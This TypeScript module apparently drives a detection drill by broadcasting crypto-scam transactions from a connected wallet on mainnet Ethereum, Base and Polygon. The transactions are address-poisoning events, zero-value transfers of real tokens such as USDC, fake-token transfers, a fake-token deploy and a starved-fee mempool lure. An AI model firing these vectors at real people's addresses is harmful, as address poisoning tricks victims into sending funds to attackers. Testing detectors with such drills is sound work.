/**
 * Client-side trigger broadcast via the admin's linked EIP-1193 wallet
 * (MetaMask / Trust Wallet / Rabby / WalletConnect). No seed phrases,
 * no demo signer — the connected wallet signs in-browser.
 */

import {
  encodeFunctionData,
  formatEther,
  getAddress,
  isAddress,
  parseEther,
  type Hash,
  type Hex,
} from "viem";
import { FAKE_TOKEN_BYTECODE } from "./fakeTokenArtifact";
import {
  getActiveWalletAddress,
  getActiveWalletProvider,
  type Eip1193Provider,
} from "./walletProvider";
import { walletErrorMessage } from "./walletErrors";

export type ClientVector = "mempoolLure" | "addressPoisoning" | "fakeTokenTransfer" | "zeroValue";

const TRANSFER_ABI = [
  {
    name: "transfer",
    type: "function",
    stateMutability: "nonpayable",
    inputs: [
      { name: "to", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ name: "", type: "bool" }],
  },
] as const;

/**
 * Chain-aware default tokens for zero-value transfers (real, verified ERC-20s).
 * A `transfer(target, 0)` emits a real Transfer event with zero balance delta —
 * the classic zero-value poisoning pattern — without needing a custom contract.
 */
const ZERO_VALUE_DEFAULT_TOKENS: Record<number, `0x${string}`> = {
  8453: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDC on Base (verified on-chain: USD Coin, 6 decimals)
  1: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC on Ethereum
};

export type ZeroValuePreset = "USDC" | "USDT" | "WETH" | "cbBTC" | "WBTC" | "WPOL" | "cbLTC";

/** Per-preset chain defaults. Lowercase in source; getAddress() checksums at runtime. */
const ZERO_VALUE_PRESET_TOKENS: Record<ZeroValuePreset, Record<number, `0x${string}`>> = {
  USDC: {
    8453: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDC on Base
    1: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC on Ethereum
    137: "0x3c499c542cef5e3811e1192ce70d8cc03d5c3359", // USDC on Polygon (verified: USDC, 6)
  },
  cbBTC: {
    // Coinbase Wrapped BTC — verified on-chain (Base): code present, cbBTC, 8 decimals.
    8453: "0xcbb7c0000ab88b473b1f5afd9ef808440eed33bf",
    1: "0xcbb7c0000ab88b473b1f5afd9ef808440eed33bf", // cbBTC on Ethereum
  },
  USDT: {
    // Tether USD — verified on-chain (Base): code present, USDT, 6 decimals.
    8453: "0xfde4c96c8593536e31f229ea8f37b2ada2699bb2",
    1: "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT on Ethereum
    137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", // USDT on Polygon (verified: USDT, 6)
  },
  WETH: {
    // Wrapped ETH — verified on-chain (Base): code present, WETH, 18 decimals.
    8453: "0x4200000000000000000000000000000000000006",
    1: "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2", // WETH on Ethereum
    137: "0x7ceb23fd6bc0add59e62ac25578270cff1b9f619", // WETH on Polygon (verified: WETH, 18)
  },
  WBTC: {
    // Wrapped BTC on Polygon — verified on-chain: code present, WBTC, 8 decimals.
    137: "0x1bfd67037b42cf73acf2047067bd4f2c47d9bfd6",
  },
  WPOL: {
    // Wrapped POL on Polygon — verified on-chain: code present, WPOL, 18 decimals.
    137: "0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270",
  },
  cbLTC: {
    // Coinbase Wrapped LTC — verified on-chain (Base): code present, cbLTC, 8 decimals.
    8453: "0xcb17c9db87b595717c857a08468793f5bab6445f",
  },
};

export const ZERO_VALUE_PRESET_META: Record<ZeroValuePreset, { symbol: string; decimals: number; blurb: string }> = {
  USDC: { symbol: "USDC", decimals: 6, blurb: "USD Coin" },
  WBTC: { symbol: "WBTC", decimals: 8, blurb: "Wrapped BTC (1:1 BTC)" },
  WPOL: { symbol: "WPOL", decimals: 18, blurb: "Wrapped POL" },
  USDT: { symbol: "USDT", decimals: 6, blurb: "Tether USD" },
  WETH: { symbol: "WETH", decimals: 18, blurb: "Wrapped ETH" },
  cbBTC: { symbol: "cbBTC", decimals: 8, blurb: "Coinbase Wrapped BTC (1:1 BTC)" },
  cbLTC: { symbol: "cbLTC", decimals: 8, blurb: "Coinbase Wrapped LTC (1:1 LTC)" },
};

/** Preset token address for a chain, or null when the preset is not deployed there. */
export function zeroValuePresetAddress(
  preset: ZeroValuePreset,
  chainId: number | undefined
): `0x${string}` | null {
  if (!chainId) return null;
  return ZERO_VALUE_PRESET_TOKENS[preset]?.[chainId] ?? null;
}

export function resolveZeroValueToken(
  chainId: number | undefined,
  override: string | undefined,
  preset: ZeroValuePreset = "USDC"
): `0x${string}` {
  if (override && override.trim()) {
    if (!isAddress(override.trim())) {
      throw new Error("Contract override is not a valid EVM address.");
    }
    return getAddress(override.trim());
  }
  const presetMap = ZERO_VALUE_PRESET_TOKENS[preset] ?? ZERO_VALUE_PRESET_TOKENS.USDC;
  if (chainId && presetMap[chainId]) {
    return presetMap[chainId];
  }
  if (chainId && ZERO_VALUE_DEFAULT_TOKENS[chainId]) {
    return ZERO_VALUE_DEFAULT_TOKENS[chainId];
  }
  throw new Error(`No ${preset} token for chain ${chainId ?? "?"}. Set a contract.`);
}

export type ClientTriggerResult = {
  txHash: Hash;
  vector: "MEMPOOL_SPOOF_LURE" | "ADDRESS_POISONING" | "FAKE_TOKEN_TRANSFER";
  targetAddress: string;
  fromAddress: string;
  broadcastAt: string;
};

function requireProvider(): { provider: Eip1193Provider; from: string } {
  const provider = getActiveWalletProvider();
  const from = getActiveWalletAddress();
  if (!provider || !from) {
    throw new Error("Connect a wallet to sign.");
  }
  return { provider, from };
}

const CHAIN_META: Record<
  number,
  { chainName: string; rpcUrls: string[]; nativeCurrency: { name: string; symbol: string; decimals: number }; blockExplorerUrls: string[] }
> = {
  8453: {
    chainName: "Base",
    rpcUrls: ["https://mainnet.base.org"],
    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
    blockExplorerUrls: ["https://basescan.org"],
  },
  137: {
    chainName: "Polygon",
    rpcUrls: ["https://polygon.publicnode.com"],
    nativeCurrency: { name: "POL", symbol: "POL", decimals: 18 },
    blockExplorerUrls: ["https://polygonscan.com"],
  },
  1: {
    chainName: "Ethereum",
    rpcUrls: ["https://cloudflare-eth.com"],
    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
    blockExplorerUrls: ["https://etherscan.io"],
  },
};

async function sendTx(
  provider: Eip1193Provider,
  tx: {
    from: string;
    /** Omitted for contract-creation (deploy) transactions. */
    to?: string;
    data?: Hex;
    value?: Hex;
    maxFeePerGas?: Hex;
    maxPriorityFeePerGas?: Hex;
  }
): Promise<Hash> {
  try {
    const hash = (await provider.request({
      method: "eth_sendTransaction",
      params: [tx],
    })) as string;
    if (!hash || typeof hash !== "string" || !hash.startsWith("0x")) {
      throw new Error("No transaction hash.");
    }
    return hash as Hash;
  } catch (err) {
    throw new Error(walletErrorMessage(err, "Transaction failed."));
  }
}

/** Ask wallet to switch (and add if missing) to the configured chain. */
export async function ensureWalletChain(chainId: number): Promise<void> {
  const { provider } = requireProvider();
  const hexId = `0x${chainId.toString(16)}`;
  try {
    // Some wallets answer eth_chainId with a decimal number instead of a hex
    // string — normalize before comparing so we never call toLowerCase on one.
    const rawChainId: unknown = await provider.request({ method: "eth_chainId" });
    const currentHex =
      typeof rawChainId === "number"
        ? `0x${rawChainId.toString(16)}`
        : typeof rawChainId === "string"
          ? rawChainId
          : null;
    if (currentHex && currentHex.toLowerCase() === hexId.toLowerCase()) return;
    await provider.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: hexId }],
    });
  } catch (err) {
    const code =
      err && typeof err === "object" && "code" in err ? Number((err as { code: unknown }).code) : NaN;
    const msg = err instanceof Error ? err.message : String(err);
    if (code === 4001 || /user rejected|denied/i.test(msg)) {
      throw new Error("Rejected in wallet.");
    }
    const meta = CHAIN_META[chainId];
    if (meta && (code === 4902 || /unrecognized chain|unknown chain/i.test(msg))) {
      try {
        await provider.request({
          method: "wallet_addEthereumChain",
          params: [
            {
              chainId: hexId,
              chainName: meta.chainName,
              rpcUrls: meta.rpcUrls,
              nativeCurrency: meta.nativeCurrency,
              blockExplorerUrls: meta.blockExplorerUrls,
            },
          ],
        });
        return;
      } catch (addErr) {
        throw new Error(walletErrorMessage(addErr, `Add chain ${chainId} in wallet.`));
      }
    }
    throw new Error(walletErrorMessage(err, `Switch wallet to chain ${chainId}.`));
  }
}

export async function fireMempoolLureFromWallet(
  targetAddress: string,
  amountEth = "0.001",
  chainId?: number
): Promise<ClientTriggerResult> {
  const { provider, from } = requireProvider();
  if (chainId) await ensureWalletChain(chainId);

  // Deliberately low tip/fee hint — wallet may override; still a live lure tx.
  const value = `0x${parseEther(amountEth).toString(16)}` as Hex;
  const txHash = await sendTx(provider, {
    from,
    to: targetAddress,
    value,
    maxPriorityFeePerGas: "0x1",
  });

  return {
    txHash,
    vector: "MEMPOOL_SPOOF_LURE",
    targetAddress,
    fromAddress: from,
    broadcastAt: new Date().toISOString(),
  };
}

export async function fireAddressPoisoningFromWallet(
  targetAddress: string,
  fakeTokenContract: string,
  chainId?: number
): Promise<ClientTriggerResult> {
  const { provider, from } = requireProvider();
  if (chainId) await ensureWalletChain(chainId);

  const data = encodeFunctionData({
    abi: [
      {
        name: "emitPoisonedTransfer",
        type: "function",
        stateMutability: "nonpayable",
        inputs: [{ name: "to", type: "address" }],
        outputs: [],
      },
    ] as const,
    functionName: "emitPoisonedTransfer",
    args: [targetAddress as `0x${string}`],
  });

  const txHash = await sendTx(provider, {
    from,
    to: fakeTokenContract,
    data,
  });

  return {
    txHash,
    vector: "ADDRESS_POISONING",
    targetAddress,
    fromAddress: from,
    broadcastAt: new Date().toISOString(),
  };
}

export async function fireFakeTokenTransferFromWallet(
  targetAddress: string,
  fakeTokenContract: string,
  amount = "1000000000000000000",
  chainId?: number
): Promise<ClientTriggerResult> {
  const { provider, from } = requireProvider();
  if (chainId) await ensureWalletChain(chainId);

  const data = encodeFunctionData({
    abi: [
      {
        name: "transfer",
        type: "function",
        stateMutability: "nonpayable",
        inputs: [
          { name: "to", type: "address" },
          { name: "amount", type: "uint256" },
        ],
        outputs: [{ name: "", type: "bool" }],
      },
    ] as const,
    functionName: "transfer",
    args: [targetAddress as `0x${string}`, BigInt(amount)],
  });

  const txHash = await sendTx(provider, {
    from,
    to: fakeTokenContract,
    data,
  });

  return {
    txHash,
    vector: "FAKE_TOKEN_TRANSFER",
    targetAddress,
    fromAddress: from,
    broadcastAt: new Date().toISOString(),
  };
}

/**
 * Zero-value token transfer: calls transfer(target, 0) on a real ERC-20
 * (chain default, or Contract-field override). Emits Transfer(from, target, 0)
 * with no balance movement — the exact pattern the verifier flags as
 * ADDRESS_POISONING. No custom contract deployment needed.
 */
export async function fireZeroValueTransferFromWallet(
  targetAddress: string,
  tokenOverride?: string,
  chainId?: number,
  preset?: ZeroValuePreset
): Promise<ClientTriggerResult> {
  const { provider, from } = requireProvider();
  if (!isAddress(targetAddress)) {
    throw new Error("Target is not a valid EVM address.");
  }
  const token = resolveZeroValueToken(chainId, tokenOverride, preset ?? "USDC");
  if (chainId) await ensureWalletChain(chainId);

  const data = encodeFunctionData({
    abi: TRANSFER_ABI,
    functionName: "transfer",
    args: [getAddress(targetAddress), 0n],
  });

  const txHash = await sendTx(provider, {
    from,
    to: token,
    data,
  });

  return {
    txHash,
    vector: "ADDRESS_POISONING",
    targetAddress: getAddress(targetAddress),
    fromAddress: from,
    broadcastAt: new Date().toISOString(),
  };
}

export type DeployTokenResult = {
  contractAddress: string;
  txHash: Hash;
  deployer: string;
  broadcastAt: string;
};

/**
 * Deploys the drill FakeToken (3GTT) with the connected wallet: a
 * contract-creation tx (no `to`) carrying the compiled bytecode. The full
 * initial supply is minted to the deployer, so fake-token vectors can move
 * real drill balances right after. Waits for the receipt to return the
 * contract address (up to ~3 min).
 */
export async function deployFakeTokenFromWallet(chainId?: number): Promise<DeployTokenResult> {
  const { provider, from } = requireProvider();
  if (chainId) await ensureWalletChain(chainId);

  const txHash = await sendTx(provider, {
    from,
    data: FAKE_TOKEN_BYTECODE as Hex,
  });

  const deadline = Date.now() + 180000;
  while (Date.now() < deadline) {
    await new Promise((r) => setTimeout(r, 2500));
    const receipt = (await provider.request({
      method: "eth_getTransactionReceipt",
      params: [txHash],
    })) as { contractAddress?: string } | null;
    if (receipt?.contractAddress && isAddress(receipt.contractAddress)) {
      return {
        contractAddress: getAddress(receipt.contractAddress),
        txHash,
        deployer: from,
        broadcastAt: new Date().toISOString(),
      };
    }
  }
  throw new Error(`Deploy pending: ${txHash}. Paste contract when mined.`);
}

export type GasEstimate = {
  gasLimit: string;
  gasPriceWei: string;
  feeEth: string;
};

/**
 * Read-only gas preview for the no-contract vectors (no signature, no broadcast).
 * Estimates at current network price for reference; the mempool lure itself is
 * broadcast at a deliberately starved fee so it stays pending.
 */
export async function estimateVectorGas(input: {
  vector: "mempoolLure" | "zeroValue";
  targetAddress: string;
  amountEth?: string;
  tokenPreset?: ZeroValuePreset;
  fakeTokenContract?: string;
  chainId?: number;
}): Promise<GasEstimate> {
  const { provider, from } = requireProvider();
  if (!isAddress(input.targetAddress)) {
    throw new Error("Target is not a valid EVM address.");
  }
  const target = getAddress(input.targetAddress);
  let tx: { from: string; to: string; data?: Hex; value?: Hex };
  if (input.vector === "mempoolLure") {
    const amount = (input.amountEth ?? "0.001").trim();
    if (!/^\d*\.?\d+$/.test(amount) || Number(amount) <= 0) {
      throw new Error("Value must be a positive number.");
    }
    tx = { from, to: target, value: `0x${parseEther(amount).toString(16)}` as Hex };
  } else {
    const token = resolveZeroValueToken(input.chainId, input.fakeTokenContract, input.tokenPreset ?? "USDC");
    tx = {
      from,
      to: token,
      data: encodeFunctionData({ abi: TRANSFER_ABI, functionName: "transfer", args: [target, 0n] }),
    };
  }
  const gasHex = (await provider.request({ method: "eth_estimateGas", params: [tx] })) as string;
  const priceHex = (await provider.request({ method: "eth_gasPrice", params: [] })) as string;
  const gas = BigInt(gasHex);
  const price = BigInt(priceHex);
  return { gasLimit: gas.toString(), gasPriceWei: price.toString(), feeEth: formatEther(gas * price) };
}

export async function fireVectorFromLinkedWallet(input: {
  vector: ClientVector;
  targetAddress: string;
  fakeTokenContract?: string;
  tokenPreset?: ZeroValuePreset;
  amount?: string;
  chainId?: number;
}): Promise<ClientTriggerResult> {
  switch (input.vector) {
    case "mempoolLure":
      return fireMempoolLureFromWallet(
        input.targetAddress,
        input.amount ?? "0.001",
        input.chainId
      );
    case "addressPoisoning":
      if (!input.fakeTokenContract) {
        throw new Error("Contract required.");
      }
      return fireAddressPoisoningFromWallet(
        input.targetAddress,
        input.fakeTokenContract,
        input.chainId
      );
    case "fakeTokenTransfer":
      if (!input.fakeTokenContract) {
        throw new Error("Contract required.");
      }
      return fireFakeTokenTransferFromWallet(
        input.targetAddress,
        input.fakeTokenContract,
        input.amount ?? "1000000000000000000",
        input.chainId
      );
    case "zeroValue":
      return fireZeroValueTransferFromWallet(
        input.targetAddress,
        input.fakeTokenContract,
        input.chainId,
        input.tokenPreset ?? "USDC"
      );
    default:
      throw new Error(`Unknown vector: ${input.vector}`);
  }
}
